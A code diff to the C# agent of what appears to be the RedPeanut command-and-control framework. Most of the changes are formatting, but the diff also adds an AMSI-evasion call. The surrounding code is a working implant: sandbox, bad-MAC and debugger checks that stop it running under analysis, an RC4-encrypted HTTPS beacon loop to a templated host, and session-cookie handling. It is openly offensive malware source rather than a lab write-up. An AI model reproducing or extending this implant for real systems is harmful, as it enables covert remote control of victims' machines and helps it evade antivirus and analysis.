@@ -1,37 +1,39 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Security;
+using System.Diagnostics;
 using System.IO;
 using System.IO.Compression;
 using System.IO.Pipes;
 using System.Linq;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Net.Security;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Web.Script.Serialization;
-using System.Net.NetworkInformation;
-using System.Text.RegularExpressions;
 
 public class RedPeanutRP
 {
     public RedPeanutRP()
     {
         try
-            {
-    	if(!containsSandboxArtifacts() && !isBadMac() && !isDebugged())
-          Execute();
-          }
-            catch (WebException )
-            {
-                
-            }
+        {
+            if (!containsSandboxArtifacts() && !isBadMac() && !isDebugged())
+                Execute();
+        }
+        catch (WebException)
+        {
+
+        }
     }
 
     static void Main(string[] args)
     {
-        if(!containsSandboxArtifacts() && !isBadMac() && !isDebugged())
-        	Execute();
+        if (!containsSandboxArtifacts() && !isBadMac() && !isDebugged())
+            Execute();
     }
 
     public static void Execute()
@@ -49,6 +51,7 @@ public class RedPeanutRP
         string host = "#HOST#";
 
         string namedpipe = "#PIPENAME#";
+        bool amsievasion = true;
 
         int port = 0;
         int targetframework = 40;
@@ -62,10 +65,12 @@ public class RedPeanutRP
         agentIdReqMsg.port = port;
         agentIdReqMsg.request = "agentid";
         agentIdReqMsg.framework = targetframework;
-        
+
 
         string agentidrequesttemplate = new JavaScriptSerializer().Serialize(agentIdReqMsg);
         bool agentexit = false;
+
+        RedPeanutAgent.Evasion.Evasion.Evade(amsievasion);
 
         while (true && !agentexit)
         {
@@ -98,7 +103,7 @@ public class RedPeanutRP
                     string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)], post);
 
                     resp = wc.UploadString(rpaddress, post);
-                    
+
                     Cookie cookie = wc.ResponseCookies["sessionid"];
                     cookievalue = cookie.Value;
                 }
@@ -140,8 +145,8 @@ public class RedPeanutRP
             }
             catch (SystemException e)
             {
-                if(e.Data.Contains("reason"))
-                    if(e.Data["reason"].Equals("exit"))
+                if (e.Data.Contains("reason"))
+                    if (e.Data["reason"].Equals("exit"))
                         agentexit = true;
             }
         }
@@ -223,7 +228,7 @@ public class RedPeanutRP
             return ms.ToArray();
         }
     }
-    
+
     //Sharpshooter
     // Returns true if possible sandbox artifacts exist on file system
     public static bool containsSandboxArtifacts()
@@ -264,7 +269,7 @@ public class RedPeanutRP
         }
     }
 
-	//Sharpshooter
+    //Sharpshooter
     // Return true is machine matches a bad MAC vendor
     public static bool isBadMac()
     {
@@ -294,7 +299,7 @@ public class RedPeanutRP
         }
 
     }
-    
+
     //Sharpshooter
     // Return true if a debugger is attached
     private static bool isDebugged()
@@ -309,8 +314,6 @@ public class RedPeanutRP
         }
     }
 
-    
-
     private static string DecryptMessage(string sessionkey, string input)
     {
         return RC4.Decrypt(sessionkey, input);
@@ -321,77 +324,77 @@ public class RedPeanutRP
         return RC4.Encrypt(sessionkey, input);
     }
 
-    
+
 }
 
 public static class RC4
+{
+    public static string Encrypt(string key, string data)
     {
-        public static string Encrypt(string key, string data)
-        {
-            Encoding unicode = Encoding.Unicode;
+        Encoding unicode = Encoding.Unicode;
 
-            return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
-        }
-
-        public static string Decrypt(string key, string data)
-        {
-            Encoding unicode = Encoding.Unicode;
-
-            return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));
-        }
-
-        public static byte[] Encrypt(byte[] key, byte[] data)
-        {
-            return EncryptOutput(key, data).ToArray();
-        }
-
-        public static byte[] Decrypt(byte[] key, byte[] data)
-        {
-            return EncryptOutput(key, data).ToArray();
-        }
-
-        private static byte[] EncryptInitalize(byte[] key)
-        {
-            byte[] s = Enumerable.Range(0, 256)
-              .Select(i => (byte)i)
-              .ToArray();
-
-            for (int i = 0, j = 0; i < 256; i++)
-            {
-                j = (j + key[i % key.Length] + s[i]) & 255;
-
-                Swap(s, i, j);
-            }
-
-            return s;
-        }
-
-        private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
-        {
-            byte[] s = EncryptInitalize(key);
-
-            int i = 0;
-            int j = 0;
-
-            return data.Select((b) =>
-            {
-                i = (i + 1) & 255;
-                j = (j + s[i]) & 255;
-
-                Swap(s, i, j);
-
-                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
-            });
-        }
-
-        private static void Swap(byte[] s, int i, int j)
-        {
-            byte c = s[i];
-
-            s[i] = s[j];
-            s[j] = c;
-        }
+        return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
     }
+
+    public static string Decrypt(string key, string data)
+    {
+        Encoding unicode = Encoding.Unicode;
+
+        return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));
+    }
+
+    public static byte[] Encrypt(byte[] key, byte[] data)
+    {
+        return EncryptOutput(key, data).ToArray();
+    }
+
+    public static byte[] Decrypt(byte[] key, byte[] data)
+    {
+        return EncryptOutput(key, data).ToArray();
+    }
+
+    private static byte[] EncryptInitalize(byte[] key)
+    {
+        byte[] s = Enumerable.Range(0, 256)
+          .Select(i => (byte)i)
+          .ToArray();
+
+        for (int i = 0, j = 0; i < 256; i++)
+        {
+            j = (j + key[i % key.Length] + s[i]) & 255;
+
+            Swap(s, i, j);
+        }
+
+        return s;
+    }
+
+    private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
+    {
+        byte[] s = EncryptInitalize(key);
+
+        int i = 0;
+        int j = 0;
+
+        return data.Select((b) =>
+        {
+            i = (i + 1) & 255;
+            j = (j + s[i]) & 255;
+
+            Swap(s, i, j);
+
+            return (byte)(b ^ s[(s[i] + s[j]) & 255]);
+        });
+    }
+
+    private static void Swap(byte[] s, int i, int j)
+    {
+        byte c = s[i];
+
+        s[i] = s[j];
+        s[j] = c;
+    }
+}
 
 public class AgentIdMsg
 {
@@ -402,12 +405,13 @@ public class AgentIdMsg
 }
 
 public class AgentIdReqMsg
-    {
-        public string AgentPivot { get; set; }
-        public string address { get; set; }
-        public int port { get; set; }
-        public int framework { get; set; }
-        public string request { get; set; }
-    }
+{
+    public string AgentPivot { get; set; }
+    public string address { get; set; }
+    public int port { get; set; }
+    public int framework { get; set; }
+    public string request { get; set; }
+}
+
 
 
